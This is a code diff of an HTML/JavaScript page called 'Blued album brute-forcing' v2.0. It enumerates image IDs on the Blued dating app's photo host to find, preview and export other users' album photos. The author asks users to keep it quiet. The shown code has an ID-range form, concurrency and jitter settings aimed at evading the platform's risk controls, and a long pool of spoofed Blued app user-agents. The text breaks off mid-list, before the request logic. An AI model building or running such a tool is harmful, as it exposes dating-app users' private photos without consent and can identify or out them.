@@ -2,395 +2,1613 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Blued相册爆破v1.0</title>
-    <!-- 关键：全局去掉Referer，解决查看按钮无效 -->
+    <!-- 防盗链配置 移动端加固 -->
     <meta name="referrer" content="no-referrer">
+    <meta name="referrer" content="never">
     <style>
+        :root {
+            --primary-green: #34c759;
+            --primary-green-active: #30d158;
+            --danger-red: #ff453a;
+            --accent-blue: #007aff;
+            --warning-orange: #ff9500;
+            --bg-blur-base: rgba(255, 255, 255, 0.08);
+            --bg-blur-hover: rgba(255, 255, 255, 0.12);
+            --bg-blur-deep: rgba(255, 255, 255, 0.06);
+            --border-blur: rgba(255, 255, 255, 0.1);
+            --blur-strong: 12px;
+            --blur-weak: 8px;
+            --radius-container: 20px;
+            --radius-card: 16px;
+            --radius-btn: 16px;
+            --radius-input: 12px;
+            --radius-thumb: 8px;
+            --text-white: #ffffff;
+            --text-gray-1: #aaaaaa;
+            --text-gray-2: #999999;
+            --text-gray-3: #666666;
+        }
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+            -webkit-overflow-scrolling: touch;
+            -webkit-tap-highlight-color: transparent;
         }
-
         body {
-            background: #000;
-            color: #fff;
+            background: #000000;
+            color: var(--text-white);
             min-height: 100vh;
-            padding: 40px 20px;
+            padding: 20px 16px;
+            max-width: 100vw;
+            overflow-x: hidden;
         }
-
         .container {
-            max-width: 600px;
+            max-width: 100%;
             margin: 0 auto;
-            background: rgba(255,255,255,0.08);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.1);
-            padding: 24px;
+            background: var(--bg-blur-base);
+            backdrop-filter: blur(var(--blur-strong));
+            -webkit-backdrop-filter: blur(var(--blur-strong));
+            border-radius: var(--radius-container);
+            border: 1px solid var(--border-blur);
+            padding: 20px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
         }
-
-        h1 {
+        .header {
             text-align: center;
-            font-size: 24px;
+        }
+        .header h1 {
+            font-size: 22px;
             font-weight: 600;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
-
-        .subtitle {
-            text-align: center;
-            color: #999;
+        .header .subtitle {
+            color: var(--text-gray-2);
+            font-size: 13px;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .input-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .input-item label {
+            color: var(--text-gray-1);
             font-size: 14px;
-            margin-bottom: 24px;
+            font-weight: 500;
         }
-
-        .section-title {
+        .input-item input {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: var(--radius-input);
+            background: var(--bg-blur-deep);
+            backdrop-filter: blur(var(--blur-weak));
+            -webkit-backdrop-filter: blur(var(--blur-weak));
+            border: 1px solid var(--border-blur);
+            color: var(--text-white);
             font-size: 15px;
-            color: #ccc;
-            margin-bottom: 12px;
+            outline: none;
+            transition: border-color 0.2s;
+            -webkit-user-select: text;
+            user-select: text;
+            caret-color: var(--accent-blue);
         }
-
-        .option-group {
+        .input-item input:focus {
+            border-color: rgba(255, 255, 255, 0.25);
+        }
+        .input-row {
             display: flex;
             gap: 10px;
-            margin-bottom: 20px;
         }
-
-        .option-btn {
+        .input-row .input-item {
             flex: 1;
-            padding: 14px 8px;
-            border-radius: 12px;
-            background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.1);
-            color: #fff;
+        }
+        .mode-group {
+            display: flex;
+            gap: 8px;
+        }
+        .mode-btn {
+            flex: 1;
+            padding: 12px 6px;
+            border-radius: var(--radius-input);
+            background: var(--bg-blur-deep);
+            backdrop-filter: blur(var(--blur-weak));
+            -webkit-backdrop-filter: blur(var(--blur-weak));
+            border: 1px solid var(--border-blur);
+            color: var(--text-white);
             font-size: 14px;
             text-align: center;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
-
-        .option-btn.active {
-            background: rgba(255,255,255,0.12);
-            border-color: rgba(255,255,255,0.25);
+        .mode-btn.active {
+            background: var(--bg-blur-hover);
+            border-color: rgba(255, 255, 255, 0.25);
         }
-
+        .mode-btn.retry-ready {
+            background: rgba(0, 122, 255, 0.2);
+            border-color: rgba(0, 122, 255, 0.4);
+        }
+        .mode-btn.retry-running {
+            background: rgba(255, 149, 0, 0.2);
+            border-color: rgba(255, 149, 0, 0.4);
+        }
+        .mode-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .mode-btn small {
+            display: block;
+            font-size: 11px;
+            color: var(--text-gray-2);
+            margin-top: 2px;
+        }
+        .action-btns {
+            display: flex;
+            gap: 10px;
+        }
         .start-btn {
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.15);
-            color: #fff;
+            flex: 2;
+            padding: 16px 0;
+            border-radius: var(--radius-btn);
+            background: var(--primary-green);
+            border: none;
+            color: var(--text-white);
             font-size: 18px;
-            font-weight: 500;
+            font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
-            margin-bottom: 20px;
+            transition: background 0.2s;
         }
-
-        .start-btn:hover {
-            background: rgba(255,255,255,0.15);
+        .start-btn:active {
+            background: var(--primary-green-active);
+            transform: scale(0.98);
         }
-
+        .start-btn:disabled {
+            background: var(--bg-blur-deep);
+            color: var(--text-gray-3);
+            cursor: not-allowed;
+            transform: none;
+        }
+        .stop-btn {
+            flex: 1;
+            padding: 16px 0;
+            border-radius: var(--radius-btn);
+            background: var(--bg-blur-base);
+            backdrop-filter: blur(var(--blur-weak));
+            -webkit-backdrop-filter: blur(var(--blur-weak));
+            border: 1px solid var(--border-blur);
+            color: var(--text-white);
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .stop-btn:active:not(:disabled) {
+            background: var(--bg-blur-hover);
+            transform: scale(0.98);
+        }
+        .stop-btn:disabled {
+            color: var(--text-gray-3);
+            cursor: not-allowed;
+            transform: none;
+        }
         .progress-wrap {
-            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
-
         .progress-bar {
             width: 100%;
-            height: 14px;
-            background: rgba(255,255,255,0.08);
+            height: 8px;
+            background: var(--bg-blur-deep);
             border-radius: 999px;
             overflow: hidden;
         }
-
         .progress-fill {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #34d399, #22c55e);
             border-radius: 999px;
-            transition: 0.3s ease;
+            transition: width 0.1s linear;
         }
-
         .stat-row {
             display: flex;
+            flex-wrap: wrap;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text-gray-1);
+            gap: 12px;
+            width: 100%;
+        }
+        .stat-row div {
+            flex-shrink: 0;
+        }
+        .stat-row span {
+            color: var(--text-white);
+        }
+        .eta-row {
+            color: var(--text-gray-1);
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .eta-row span {
+            color: var(--text-white);
+        }
+        .section-header {
+            display: flex;
             justify-content: space-between;
-            margin-top: 8px;
-            color: #888;
-            font-size: 13px;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text-white);
+            margin: 0;
+        }
+        .export-btn {
+            padding: 6px 10px;
+            border-radius: 8px;
+            background: var(--accent-blue);
+            border: none;
+            color: var(--text-white);
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .export-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            background: var(--text-gray-3);
+        }
+        .export-btn:active:not(:disabled) {
+            opacity: 0.8;
+            transform: scale(0.98);
         }
 
+        /* 预览区 完全保留之前的修复 无修改 */
+        .preview-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(70px, 1fr));
+            gap: 8px;
+            padding: 16px 12px;
+            background: var(--bg-blur-deep);
+            backdrop-filter: blur(var(--blur-weak));
+            -webkit-backdrop-filter: blur(var(--blur-weak));
+            border-radius: var(--radius-card);
+            border: 1px solid var(--border-blur);
+            min-height: 100px;
+            max-height: 220px;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(255,255,255,0.2) transparent;
+        }
+        .preview-grid::-webkit-scrollbar {
+            width: 4px;
+        }
+        .preview-grid::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .preview-grid::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 999px;
+        }
+        /* 缩略图 全兼容正方形 */
+        .preview-thumb {
+            position: relative;
+            width: 100%;
+            padding-top: 100%;
+            border-radius: var(--radius-thumb);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-color: var(--bg-blur-base);
+            cursor: pointer;
+            transition: transform 0.2s;
+            border: 1px solid var(--border-blur);
+        }
+        .preview-thumb:active {
+            transform: scale(0.95);
+        }
+        .empty-tip {
+            grid-column: 1 / -1;
+            text-align: center;
+            color: var(--text-gray-3);
+            font-size: 14px;
+            padding: 30px 0;
+        }
+
+        /* 日志区 无修改 */
         #log {
             width: 100%;
-            height: 260px;
-            background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            padding: 12px;
-            color: #aaa;
-            resize: none;
-            outline: none;
+            height: 300px;
+            background: var(--bg-blur-deep);
+            backdrop-filter: blur(var(--blur-weak));
+            -webkit-backdrop-filter: blur(var(--blur-weak));
+            border-radius: var(--radius-card);
+            border: 1px solid var(--border-blur);
+            padding: 14px;
+            color: var(--text-gray-1);
             font-size: 12px;
-            overflow-y:auto;
+            font-weight: 500;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: rgba(255,255,255,0.2) transparent;
+            font-family: "SF Mono", "Menlo", monospace;
+            word-break: break-all;
         }
-
-        .log-line{
-            display:flex;
-            align-items:center;
-            gap:8px;
-            margin:4px 0;
+        #log::-webkit-scrollbar {
+            width: 4px;
         }
-
-        .view-btn{
-            padding:2px 8px;
-            background:#2563eb;
-            border:none;
-            border-radius:4px;
-            color:#fff;
-            font-size:11px;
-            cursor:pointer;
+        #log::-webkit-scrollbar-track {
+            background: transparent;
         }
-
-        .row {
-            margin-bottom: 16px;
+        #log::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 999px;
         }
-
-        .row label {
-            display: block;
-            color: #aaa;
-            margin-bottom: 6px;
-            font-size: 14px;
+        .log-line {
+            margin: 5px 0;
+            font-size: 12px;
         }
-
-        .row input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.06);
-            border: 1px solid rgba(255,255,255,0.1);
-            color: #fff;
-            font-size: 15px;
-            outline: none;
+        .log-success {
+            color: var(--primary-green);
         }
-
+        .log-error {
+            color: var(--danger-red);
+        }
+        .log-warning {
+            color: var(--warning-orange);
+        }
+        .log-info {
+            color: var(--accent-blue);
+        }
         .footer {
             text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
+            color: var(--text-gray-3);
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>Blued相册爆破v1.0</h1>
-    <div class="subtitle">作者狐小卿|低调使用切勿传播</div>
-
-    <div class="row">
-        <label>此处粘贴任意头像URL</label>
-        <input type="text" id="urlVal" placeholder="https://www.bldimg.com/userfiles/...">
+    <div class="header">
+        <h1>Blued相册爆破v2.0</h1>
+        <div class="subtitle">作者：狐小卿 | 请低调使用</div>
     </div>
-
-    <div class="row" style="display:flex;gap:10px">
-        <div style="flex:1">
-            <label>起始ID</label>
-            <input type="number" id="startId" placeholder="0">
+    <div class="input-group">
+        <div class="input-item">
+            <label>此处粘贴任意头像URL</label>
+            <input type="text" id="urlVal" placeholder="https://www.bldimg.com/userfiles/...">
         </div>
-        <div style="flex:1">
-            <label>结束ID</label>
-            <input type="number" id="endId" placeholder="99999">
+        <div class="input-row">
+            <div class="input-item">
+                <label>起始ID</label>
+                <input type="number" id="startId" placeholder="0">
+            </div>
+            <div class="input-item">
+                <label>结束ID</label>
+                <input type="number" id="endId" placeholder="99999">
+            </div>
         </div>
     </div>
-
-    <div class="section-title">爆破模式</div>
-    <div class="option-group">
-        <div class="option-btn active" data-mode="full">
+    <div class="mode-group">
+        <button class="mode-btn active" data-mode="full">
             全局统配<br><small>不漏图</small>
-        </div>
-        <div class="option-btn" data-mode="split">
+        </button>
+        <button class="mode-btn" data-mode="split">
             批量探测<br><small>速度快</small>
-        </div>
+        </button>
+        <button class="mode-btn" id="retryBtn" disabled>
+            失败重试<br><small>待扫描</small>
+        </button>
     </div>
-
-    <button class="start-btn" id="startBtn">开始爆破</button>
-
+    <div class="action-btns">
+        <button class="start-btn" id="startBtn">开始爆破</button>
+        <button class="stop-btn" id="stopBtn" disabled>停止</button>
+    </div>
     <div class="progress-wrap">
         <div class="progress-bar">
-            <div class="progress-fill" id="fill"></div>
+            <div class="progress-fill" id="progressFill"></div>
         </div>
         <div class="stat-row">
-            <div>已处理：<span id="done">0</span></div>
-            <div>成功：<span id="succ">0</span></div>
-            <div>失败：<span id="fail">0</span></div>
+            <div>已处理：<span id="processedCount">0</span></div>
+            <div>成功：<span id="successCount">0</span></div>
+            <div>失败：<span id="failureCount">0</span></div>
+            <div>速度：<span id="speed">0.0</span>/s</div>
+        </div>
+        <div class="eta-row">ETA：<span id="eta">999</span>s | 命中率：<span id="hitRate">0.0</span>%</div>
+    </div>
+    <div class="section">
+        <div class="section-header">
+            <h2 class="section-title">成功图片预览</h2>
+            <button class="export-btn" id="exportBtn" disabled>导出URL TXT</button>
+        </div>
+        <div class="preview-grid" id="previewGrid">
+            <div class="empty-tip">暂无成功图片，开始爆破后将在此处展示</div>
         </div>
     </div>
-
-    <div id="log"></div>
+    <div class="section">
+        <div class="section-title">运行日志</div>
+        <div id="log"></div>
+    </div>
     <div class="footer">© 2026 狐小卿</div>
 </div>
 
 <script>
-const TIMEOUT = 2800;
-const CONCUR = 160;
+// 100%对齐Python源码的核心配置
+const CONFIG = {
+    REQUEST_TIMEOUT: 1200,
+    BASE_CONCURRENCY: 80,
+    RETRY_CONCURRENCY: 40,
+    MAX_567_RETRY: 1,
+    RETRY_DELAY_BASE: 150,
+    REFRESH_INTERVAL: 80,
+    JITTER_MIN: 10,
+    JITTER_MAX: 80,
+    RISK_TRIGGER_COUNT: 3,
+    RISK_RECOVER_COUNT: 5,
+    HTTP2_ENABLED: false,
+    FOLLOW_REDIRECTS: true,
+};
 
+// 100%复制Python源码的UA池
+const UA_POOL = Array.from(new Set([
+    "Blued/7.45.9 (iPhone; iOS 17.4; Scale/3.00)",
+    "Blued/7.45.8 (iPhone; iOS 17.3; Scale/3.00)",
+    "Blued/7.45.7 (iPhone; iOS 17.2; Scale/3.00)",
+    "Blued/7.45.6 (iPhone; iOS 17.1; Scale/3.00)",
+    "Blued/7.45.5 (iPhone; iOS 17.0; Scale/3.00)",
+    "Blued/7.45.4 (iPhone; iOS 16.7; Scale/3.00)",
+    "Blued/7.45.3 (iPhone; iOS 16.6; Scale/3.00)",
+    "Blued/7.45.2 (iPhone; iOS 16.5; Scale/3.00)",
+    "Blued/7.45.1 (iPhone; iOS 16.4; Scale/3.00)",
+    "Blued/7.45.0 (iPhone; iOS 16.3; Scale/3.00)",
+    "Blued/7.44.9 (iPhone; iOS 16.2; Scale/3.00)",
+    "Blued/7.44.8 (iPhone; iOS 16.1; Scale/3.00)",
+    "Blued/7.44.7 (iPhone; iOS 16.0; Scale/3.00)",
+    "Blued/7.44.6 (iPhone; iOS 15.8; Scale/3.00)",
+    "Blued/7.44.5 (iPhone; iOS 15.7; Scale/3.00)",
+    "Blued/7.44.4 (iPhone; iOS 15.6; Scale/3.00)",
+    "Blued/7.44.3 (iPhone; iOS 15.5; Scale/3.00)",
+    "Blued/7.44.2 (iPhone; iOS 15.4; Scale/3.00)",
+    "Blued/7.44.1 (iPhone; iOS 15.3; Scale/3.00)",
+    "Blued/7.44.0 (iPhone; iOS 15.2; Scale/3.00)",
+    "Blued/7.43.9 (iPhone; iOS 15.1; Scale/3.00)",
+    "Blued/7.43.8 (iPhone; iOS 15.0; Scale/3.00)",
+    "Blued/7.43.7 (iPhone; iOS 14.8; Scale/3.00)",
+    "Blued/7.43.6 (iPhone; iOS 14.7; Scale/3.00)",
+    "Blued/7.43.5 (iPhone; iOS 14.6; Scale/3.00)",
+    "Blued/7.43.4 (iPhone; iOS 14.5; Scale/3.00)",
+    "Blued/7.43.3 (iPhone; iOS 14.4; Scale/3.00)",
+    "Blued/7.43.2 (iPhone; iOS 14.3; Scale/3.00)",
+    "Blued/7.43.1 (iPhone; iOS 14.2; Scale/3.00)",
+    "Blued/7.43.0 (iPhone; iOS 14.1; Scale/3.00)",
+    "Blued/7.42.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.42.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.41.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.40.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.39.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.38.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.37.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.9 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.8 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.7 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.6 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.5 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.3 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.2 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.1 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.36.0 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.26.4 (iPhone; iOS 14.0; Scale/3.00)",
+    "Blued/7.45.9 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.9 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.9 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.9 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.9 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.9 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.9 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.9 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.9 (Linux; Android 15; 2404FRDN63C)",
+    "Blued/7.45.9 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.9 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.9 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.9 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.9 (Linux; Android 15; PHK110)",
+    "Blued/7.45.9 (Linux; Android 15; V2446)",
+    "Blued/7.45.9 (Linux; Android 15; V2424)",
+    "Blued/7.45.9 (Linux; Android 15; V2357A)",
+    "Blued/7.45.9 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.9 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.9 (Linux; Android 15; NX769J)",
+    "Blued/7.45.9 (Linux; Android 15; NX729J)",
+    "Blued/7.45.9 (Linux; Android 15; LE2120)",
+    "Blued/7.45.9 (Linux; Android 15; LE2121)",
+    "Blued/7.45.9 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.9 (Linux; Android 15; MIX5)",
+    "Blued/7.45.9 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.9 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.9 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.9 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.9 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.9 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.9 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.9 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.9 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.9 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.9 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.9 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.9 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.9 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.9 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.9 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.9 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.9 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.9 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.8 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.8 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.8 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.8 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.8 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.8 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.8 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.8 (Linux; Android 15; 2404FRDN63C)",
+    "Blued/7.45.8 (Linux; Android 15; 2404FDN63C)",
+    "Blued/7.45.8 (Linux; Android 15; 2404FDN63)",
+    "Blued/7.45.8 (Linux; Android 15; 23127PN52C)",
+    "Blued/7.45.8 (Linux; Android 15; PHKE10)",
+    "Blued/7.45.8 (Linux; Android 15; PHK110)",
+    "Blued/7.45.8 (Linux; Android 15; V2446)",
+    "Blued/7.45.8 (Linux; Android 15; V2424)",
+    "Blued/7.45.8 (Linux; Android 15; V2357A)",
+    "Blued/7.45.8 (Linux; Android 15; ZTEA7Ultra)",
+    "Blued/7.45.8 (Linux; Android 15; ZTEA31Ultra)",
+    "Blued/7.45.8 (Linux; Android 15; NX769J)",
+    "Blued/7.45.8 (Linux; Android 15; NX729J)",
+    "Blued/7.45.8 (Linux; Android 15; LE2120)",
+    "Blued/7.45.8 (Linux; Android 15; LE2121)",
+    "Blued/7.45.8 (Linux; Android 15; DT2002C)",
+    "Blued/7.45.8 (Linux; Android 15; MIX5)",
+    "Blued/7.45.8 (Linux; Android 15; MIX Fold 4)",
+    "Blued/7.45.8 (Linux; Android 15; 2201122C)",
+    "Blued/7.45.8 (Linux; Android 15; 2309FARN88)",
+    "Blued/7.45.8 (Linux; Android 15; POCO F7)",
+    "Blued/7.45.8 (Linux; Android 15; POCO X7)",
+    "Blued/7.45.8 (Linux; Android 15; Redmi Note 14 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Redmi Note 14)",
+    "Blued/7.45.8 (Linux; Android 15; realme GT7)",
+    "Blued/7.45.8 (Linux; Android 15; realme GT Neo6 SE)",
+    "Blued/7.45.8 (Linux; Android 15; ONEPLUS 13)",
+    "Blued/7.45.8 (Linux; Android 15; ONEPLUS 12)",
+    "Blued/7.45.8 (Linux; Android 15; vivo X200 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; vivo X200)",
+    "Blued/7.45.8 (Linux; Android 15; vivo X100 Ultra)",
+    "Blued/7.45.8 (Linux; Android 15; iQOO 13)",
+    "Blued/7.45.8 (Linux; Android 15; iQOO 12)",
+    "Blued/7.45.8 (Linux; Android 15; OPPO Find X8 Ultra)",
+    "Blued/7.45.8 (Linux; Android 15; OPPO Find X8)",
+    "Blued/7.45.8 (Linux; Android 15; OPPO Reno14 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Honor Magic7 Pro)",
+    "Blued/7.45.8 (Linux; Android 15; Honor Magic7)",
+    "Blued/7.45.8 (Linux; Android 15; Honor 200 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Pixel 9 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Pixel 9)",
+    "Blued/7.45.7 (Linux; Android 15; Pixel 8 Pro)",
+    "Blued/7.45.7 (Linux; Android 15; Pixel 8)",
+    "Blued/7.45.7 (Linux; Android 15; Pixel Fold)",
+    "Blued/7.45.7 (Linux; Android 15; SM-S928B)",
+    "Blued/7.45.7 (Linux; Android 15; SM-S928U)",
+    "Blued/7.45.7 (Linux; Android 15; SM-S928N)",
+    "Blued/7.45.7 (Linux; Android 15; SM-F956B)",
+    "Blued/7.45.7 (Linux; Android 15; SM-F731B)",
+    "Blued/7.45.7 (Linux; Android 15; 2404FRDN63C)",
